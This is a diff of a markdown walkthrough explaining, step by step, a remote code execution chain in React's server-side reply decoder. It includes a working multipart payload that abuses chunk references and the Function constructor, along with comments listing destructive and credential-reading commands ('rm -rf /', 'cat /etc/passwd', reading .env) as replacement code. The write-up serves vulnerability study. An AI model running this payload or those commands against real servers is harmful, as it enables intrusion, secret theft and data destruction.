 // ReactFlightReplyServer.js:446 - initializeModelChunk
 function initializeModelChunk(chunk) {
     const resolvedModel = chunk.value;
-    // = '{"then":"$3:map","0":{"then":"$B3"},"length":1}'
+    // resolvedModel = '{"then":"$3:map","0":{"then":"$B3"},"length":1}'
 
     // Parse the JSON string
     const rawModel = JSON.parse(resolvedModel);
-    // = { then: "$3:map", 0: { then: "$B3" }, length: 1 }
+    // rawModel = {
+    //     then: "$3:map",
+    //     0: { then: "$B3" },
+    //     length: 1
+    // }
 
-    // CRITICAL: reviveModel uses chunk._response for reference resolution!
+    // Resolve references using chunk._response
     const value = reviveModel(
         chunk._response,   // <-- ATTACKER'S FAKE RESPONSE!
         { '': rawModel },
@@ -511,24 +910,27 @@ function initializeModelChunk(chunk) {
 
 ### Explanation
 
-The `value` string is parsed as JSON, producing an object with `then`, `0`, and `length` properties. Then `reviveModel` is called to resolve any `$` references in this object - but it uses `chunk._response`, which the attacker controls!
+The nested JSON string is parsed, producing an object with references that need resolution. Critically, `reviveModel` uses `chunk._response` - which is the attacker's fake Response containing the Function constructor!
 
 ### AFTER
 
 ```javascript
-// After JSON.parse, we have:
+// After JSON.parse:
 rawModel = {
-    "then": "$3:map",     // <-- Needs resolution (will become Array.map)
-    "0": {
-        "then": "$B3"     // <-- Needs resolution (will trigger RCE!)
+    then: "$3:map",           // Needs resolution
+    0: {
+        then: "$B3"           // Needs resolution
     },
-    "length": 1           // Makes it array-like
+    length: 1
 }
 
-// reviveModel will resolve these references using the FAKE response:
-response = {
+// reviveModel will resolve these using:
+fakeResponse = {
     _prefix: "console.log(7*7+1)//",
-    _formData: { get: Function }
+    _formData: {
+        get: Function
+    },
+    _chunks: "$2:_response:_chunks"
 }
 ```
 
@@ -539,15 +941,22 @@ response = {
 ### BEFORE
 
 ```javascript
-// Resolving the outer object's "then" property
+// Currently resolving:
 rawModel = {
-    "then": "$3:map",     // <-- Currently resolving this
-    "0": { "then": "$B3" },
-    "length": 1
+    then: "$3:map",           // <-- Resolving this
+    0: {
+        then: "$B3"
+    },
+    length: 1
 }
 
-// Available chunks
-chunk3.value = []  // Empty array with access to Array.prototype.map
+// Chunk 3 contains:
+chunk3 = {
+    status: "initialized",
+    value: [],                // Empty array
+    reason: null,
+    _response: response
+}
 ```
 
 ### CODE
@@ -563,27 +972,29 @@ let value = chunks[3].value;       // value = []
 for (let i = 1; i < path.length; i++) {
     value = value[path[i]];
 }
-// Loop iteration 1: value = []["map"] → Array.prototype.map
+// Iteration 1: value = []["map"] = Array.prototype.map
 
 return value;  // Returns Array.prototype.map!
 ```
 
 ### Explanation
 
-The path `"3:map"` means "get chunk 3, then access its `map` property". Chunk 3 is an empty array, and arrays have a `map` method. So this resolves to `Array.prototype.map`.
+The path `"3:map"` means "get chunk 3's value, then access its `map` property". Arrays have a `map` method, so this returns `Array.prototype.map`.
 
 ### AFTER
 
 ```javascript
-// After resolving "$3:map"
+// After resolving "$3:map":
 rawModel = {
-    "then": Array.prototype.map,  // <-- Now a function! Object is THENABLE
-    "0": { "then": "$B3" },       // <-- Still needs resolution
-    "length": 1
+    then: function map() { [native code] },  // <-- Array.prototype.map!
+    0: {
+        then: "$B3"           // Still needs resolution
+    },
+    length: 1
 }
 
-// This object is now "thenable" because it has a "then" function
-// When JavaScript tries to resolve it, it will call:
+// This object is now THENABLE because "then" is a function!
+// When JavaScript resolves it, it will call:
 //   rawModel.then(resolve, reject)
 // Which is actually:
 //   Array.prototype.map.call(rawModel, resolve)
@@ -596,45 +1007,55 @@ rawModel = {
 ### BEFORE
 
 ```javascript
-// The resolved outer object
+// The outer object:
 outerObject = {
-    then: Array.prototype.map,   // This is the "then" method
-    0: { then: "$B3" },          // Item at index 0
-    length: 1                    // Array-like length
+    then: function map() { [native code] },  // Array.prototype.map
+    0: {
+        then: "$B3"
+    },
+    length: 1
 }
-
-// JavaScript will call: outerObject.then(resolveCallback, rejectCallback)
 ```
 
 ### CODE
 
 ```javascript
-// JavaScript Promise resolution calls:
+// JavaScript sees "then" is a function, so it calls:
 outerObject.then(resolveCallback, rejectCallback)
 
-// Since outerObject.then = Array.prototype.map, this becomes:
+// This is actually:
 Array.prototype.map.call(outerObject, resolveCallback)
 
-// Array.map sees outerObject as array-like: { 0: {...}, length: 1 }
-// It iterates over indices 0 through length-1:
+// Array.map treats outerObject as array-like because it has:
+// - Property "0" (element at index 0)
+// - Property "length" (value: 1)
+
+// So map iterates:
 for (let i = 0; i < outerObject.length; i++) {
-    const item = outerObject[i];        // item = { then: "$B3" }
-    resolveCallback(item, i, outerObject);  // Tries to resolve item
+    const item = outerObject[i];
+    // i = 0: item = { then: "$B3" }
+
+    const result = resolveCallback(item, i, outerObject);
+    // This tries to resolve { then: "$B3" } as a value
 }
 ```
 
 ### Explanation
 
-When JavaScript sees an object with a `then` function, it calls it. Here, `then` is `Array.map`, so it iterates over the object as if it were an array. For each item, it calls the resolve callback - which will try to resolve `{then: "$B3"}` as another thenable.
+Since `then` is `Array.prototype.map`, calling it iterates over the object. The object has `0: {...}` and `length: 1`, so map processes one item. This item `{then: "$B3"}` needs its `then` property resolved.
 
 ### AFTER
 
 ```javascript
-// Array.map found one item at index 0:
-innerObject = { then: "$B3" }  // <-- This needs resolution
+// Array.map found item at index 0:
+innerObject = {
+    then: "$B3"               // <-- Needs resolution!
+}
 
-// The "$B3" reference must be resolved before this object can be used
-// This is where the RCE happens!
+// When "$B3" is resolved, it will use the FAKE response:
+// fakeResponse._formData.get(fakeResponse._prefix + "3")
+// = Function("console.log(7*7+1)//" + "3")
+// = Function("console.log(7*7+1)//3")
 ```
 
 ---
@@ -645,14 +1066,17 @@ innerObject = { then: "$B3" }  // <-- This needs resolution
 
 ```javascript
 // Currently resolving:
-innerObject = { then: "$B3" }  // <-- "$B3" needs resolution
-                    ↑
-                    // $B = Blob handler, 3 = blob ID
+innerObject = {
+    then: "$B3"               // <-- Resolving this
+}
 
-// The response object being used (ATTACKER CONTROLLED):
-response = {
+// The fake response being used:
+fakeResponse = {
     _prefix: "console.log(7*7+1)//",
-    _formData: { get: Function }   // Function constructor!
+    _formData: {
+        get: Function         // The Function constructor!
+    },
+    _chunks: "$2:_response:_chunks"
 }
 ```
 
@@ -661,28 +1085,30 @@ response = {
 ```javascript
 // ReactFlightReplyServer.js - parseModelString
 function parseModelString(response, parentObject, key, value) {
+    // value = "$B3"
+    // response = fakeResponse (attacker controlled!)
+
     switch (value[1]) {
         case 'B': {
-            // "$B3" → Blob reference
+            // "$B" = Blob reference
             const id = parseInt(value.slice(2), 16);
             // id = 3
 
             const prefix = response._prefix;
-            // prefix = "console.log(7*7+1)//"   ← ATTACKER'S CODE!
+            // prefix = "console.log(7*7+1)//"
 
             const blobKey = prefix + id;
             // blobKey = "console.log(7*7+1)//" + "3"
             // blobKey = "console.log(7*7+1)//3"
 
             return response._formData.get(blobKey);
-            // response._formData.get = Function   ← FUNCTION CONSTRUCTOR!
+            // response._formData.get = Function
             //
-            // This becomes: Function("console.log(7*7+1)//3")
+            // This call: Function("console.log(7*7+1)//3")
             //
-            // Which creates:
-            // function anonymous() {
-            //     console.log(7*7+1)//3
-            // }
+            // Creates: function anonymous() {
+            //              console.log(7*7+1)//3
+            //          }
         }
     }
 }
@@ -690,22 +1116,26 @@ function parseModelString(response, parentObject, key, value) {
 
 ### Explanation
 
-The `$B` prefix triggers the Blob handler. Normally it would look up a blob by constructing a key from `_prefix` + id. But the attacker controls `response._prefix` (the malicious code) and `response._formData.get` (the Function constructor). So instead of looking up a blob, it calls `Function("malicious code")` which creates an executable function!
+The `$B` prefix normally looks up blob data. It constructs a key from `_prefix + id` and calls `_formData.get(key)`. But the attacker controls both:
+- `_prefix` = malicious JavaScript code
+- `_formData.get` = the Function constructor
 
-The `//` at the end of the prefix is a JavaScript comment that hides the appended ID (`3`), so the code remains valid.
+So instead of looking up a blob, it calls `Function("malicious code")`, creating an executable function!
+
+The `//` at the end comments out the appended `3`, keeping the code syntactically valid.
 
 ### AFTER
 
 ```javascript
-// The "$B3" reference resolved to a malicious function:
+// After resolving "$B3":
 innerObject = {
     then: function anonymous() {
         console.log(7*7+1)//3
     }
 }
 
-// This object now has a "then" property that is a FUNCTION
-// JavaScript will treat it as a thenable and CALL the function!
+// This object is now THENABLE because "then" is a function!
+// When JavaScript resolves it, it will CALL this function!
 ```
 
 ---
@@ -715,14 +1145,14 @@ innerObject = {
 ### BEFORE
 
 ```javascript
-// The inner object is now:
+// The inner object:
 innerObject = {
     then: function anonymous() {
-        console.log(7*7+1)//3   // Malicious code
+        console.log(7*7+1)//3
     }
 }
 
-// JavaScript sees this as a thenable (has "then" function)
+// JavaScript sees "then" is a function
 // It will call: innerObject.then(resolve, reject)
 ```
 
@@ -732,120 +1162,131 @@ innerObject = {
 // JavaScript Promise resolution:
 innerObject.then(resolve, reject)
 
-// This CALLS the malicious function:
+// This CALLS the function:
 (function anonymous() {
     console.log(7*7+1)//3
 })(resolve, reject)
 
-// The function executes!
-// console.log(7*7+1) → console.log(50) → prints "50"
-// //3 is just a comment, ignored
+// The function body executes:
+console.log(7*7+1)    // Evaluates to console.log(50)
+//3                   // This is just a comment, ignored
+
+// Output: 50
 ```
 
 ### Explanation
 
-When JavaScript tries to resolve the inner thenable, it calls `innerObject.then()`. But `then` is our malicious function! The function executes with `resolve` and `reject` as arguments (which it ignores), and runs `console.log(7*7+1)`.
+JavaScript treats `innerObject` as a thenable and calls its `then` method. But `then` is our malicious function! It executes and runs `console.log(7*7+1)`, printing `50` to the server console.
 
 ### AFTER
 
 ```javascript
-// RESULT:
-// Server console output: 50
+// Server console output:
+// 50
 
-// The attacker achieved Remote Code Execution!
-// They can replace "console.log(7*7+1)" with any code:
-//   - require('child_process').exec('rm -rf /')
-//   - Read environment variables
-//   - Access the filesystem
-//   - Establish reverse shells
-//   - Anything Node.js can do!
+// REMOTE CODE EXECUTION ACHIEVED!
+
+// The attacker can replace "console.log(7*7+1)" with anything:
+// - require('child_process').execSync('cat /etc/passwd')
+// - require('fs').readFileSync('/app/.env')
+// - process.env.DATABASE_PASSWORD
+// - Reverse shell, data exfiltration, etc.
 ```
 
 ---
 
-## Complete Payload Transformation Summary
+## Final State Summary
 
-### Initial Payload (Strings)
-
-```javascript
-{
-    "0": "$1",
-    "1": '{"status":"resolved_model","_response":"$4","value":"{...}","then":"$2:then"}',
-    "2": "$@3",
-    "3": "[]",
-    "4": '{"_prefix":"console.log(7*7+1)//","_formData":{"get":"$3:constructor:constructor"}}'
-}
-```
-
-### After Resolution (Objects)
+### All Chunks After Full Resolution
 
 ```javascript
-{
-    "0": → chunk1,
-    "1": {
-        status: "resolved_model",
-        _response: chunk4,              // Fake Response
-        value: "{...}",                 // Nested payload
-        then: Chunk.prototype.then      // Makes chunk1 thenable
+response._chunks = {
+    0: {
+        status: "initialized",
+        value: response._chunks[1].value,
+        reason: null,
+        _response: response
     },
-    "2": Chunk { value: [], then: Chunk.prototype.then },
-    "3": [],                            // Gadget array
-    "4": {
-        _prefix: "console.log(7*7+1)//", // Malicious code
-        _formData: { get: Function }     // RCE gadget
+    1: {
+        status: "initialized",
+        value: {
+            status: "resolved_model",
+            reason: 0,
+            _response: {
+                _prefix: "console.log(7*7+1)//",
+                _formData: {
+                    get: Function
+                },
+                _chunks: response._chunks
+            },
+            value: '{"then":"$3:map","0":{"then":"$B3"},"length":1}',
+            then: function(resolve, reject) { /* Chunk.prototype.then */ }
+        },
+        reason: null,
+        _response: response
+    },
+    2: {
+        status: "initialized",
+        value: response._chunks[3],  // Raw chunk 3 object
+        reason: null,
+        _response: response
+    },
+    3: {
+        status: "initialized",
+        value: [],
+        reason: null,
+        _response: response
+    },
+    4: {
+        status: "initialized",
+        value: {
+            _prefix: "console.log(7*7+1)//",
+            _formData: {
+                get: Function
+            },
+            _chunks: response._chunks
+        },
+        reason: null,
+        _response: response
     }
 }
 ```
 
-### Execution Chain
+### The Execution Chain
 
 ```
-await boundActionArguments
-       ↓
-chunk1.then() called
-       ↓ (status = "resolved_model")
-initializeModelChunk(chunk1)
-       ↓ (uses chunk1._response = FAKE)
-JSON.parse(chunk1.value)
-       ↓
-{ then: "$3:map", 0: { then: "$B3" }, length: 1 }
-       ↓ (resolve "$3:map")
-{ then: Array.map, 0: { then: "$B3" }, length: 1 }
-       ↓ (thenable.then() = Array.map.call(...))
-Array.map iterates, finds { then: "$B3" }
-       ↓ (resolve "$B3" with FAKE response)
-FAKE._formData.get(FAKE._prefix + "3")
-       ↓
-Function("console.log(7*7+1)//3")
-       ↓
-{ then: function() { console.log(7*7+1)//3 } }
-       ↓ (thenable.then() called)
-function EXECUTES!
-       ↓
-╔═══════════════════════════════════╗
-║  console.log(50) → RCE ACHIEVED!  ║
-╚═══════════════════════════════════╝
+HTTP Request with malicious form fields
+    ↓
+decodeReplyFromBusboy() stores chunks 0-4
+    ↓
+Returns chunk 0 (points to chunk 1)
+    ↓
+await chunk1 (which has "then" = Chunk.prototype.then)
+    ↓
+JavaScript calls chunk1.then(resolve, reject)
+    ↓
+Chunk.prototype.then sees status = "resolved_model"
+    ↓
+Calls initializeModelChunk(chunk1) with chunk1._response = FAKE
+    ↓
+Parses nested JSON: { then: "$3:map", 0: { then: "$B3" }, length: 1 }
+    ↓
+Resolves "$3:map" → Array.prototype.map
+    ↓
+Object becomes thenable, JS calls .then() = Array.map
+    ↓
+map() iterates, finds { then: "$B3" }
+    ↓
+Resolves "$B3" using FAKE response:
+    FAKE._formData.get(FAKE._prefix + "3")
+    = Function("console.log(7*7+1)//3")
+    ↓
+Creates function, object becomes thenable
+    ↓
+JS calls .then() = malicious function
+    ↓
+╔═══════════════════════════════════════╗
+║  FUNCTION EXECUTES: console.log(50)   ║
+║  REMOTE CODE EXECUTION ACHIEVED!      ║
+╚═══════════════════════════════════════╝
 ```
-
----
-
-## Quick Reference
-
-### What Each Chunk Does
-
-| Chunk | Initial Value | Resolves To | Purpose |
-|-------|--------------|-------------|---------|
-| `0` | `"$1"` | chunk1 | Entry point |
-| `1` | `{status, _response, value, then}` | Thenable with fake response | Triggers initializeModelChunk |
-| `2` | `"$@3"` | Raw Chunk object | Provides access to Chunk.prototype.then |
-| `3` | `"[]"` | `[]` | Prototype chain to Function |
-| `4` | `{_prefix, _formData}` | Fake Response | Contains malicious code + Function constructor |
-
-### Key Symbols
-
-| Symbol | Meaning | Example |
-|--------|---------|---------|
-| `$N` | Reference chunk N's value | `$1` → chunk1.value |
-| `$@N` | Reference chunk N itself (raw) | `$@3` → Chunk object |
-| `$BN` | Blob reference (triggers Blob handler) | `$B3` → RCE trigger |
-| `X:Y:Z` | Property traversal | `3:constructor:constructor` → Function |
